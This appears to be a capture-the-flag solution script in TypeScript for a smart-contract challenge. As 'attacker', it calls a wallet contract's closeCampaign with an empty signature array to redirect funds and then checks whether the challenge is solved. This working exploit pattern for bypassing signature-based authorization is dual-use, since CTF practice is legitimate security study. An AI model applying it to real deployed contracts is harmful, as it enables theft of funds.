import chalk from "chalk";
import { ethers } from "hardhat";
import { SetupFSHTBBusiness23__factory, SetupFSHTBBusiness23, CouncilWalletHTBBusiness23__factory } from "../../typechain";
import { log, initialize } from "../utils";
import {randomBytes} from "crypto";

async function main() {
    let [setupHTBBusiness23Contract, attacker] = await initialize<SetupFSHTBBusiness23>(SetupFSHTBBusiness23__factory, undefined, undefined, "1100");
    let wallet = CouncilWalletHTBBusiness23__factory.connect(await setupHTBBusiness23Contract.WALLET(), attacker);
    let tx = await wallet.closeCampaign([], attacker.address, await setupHTBBusiness23Contract.TARGET());
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await setupHTBBusiness23Contract.isSolved())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});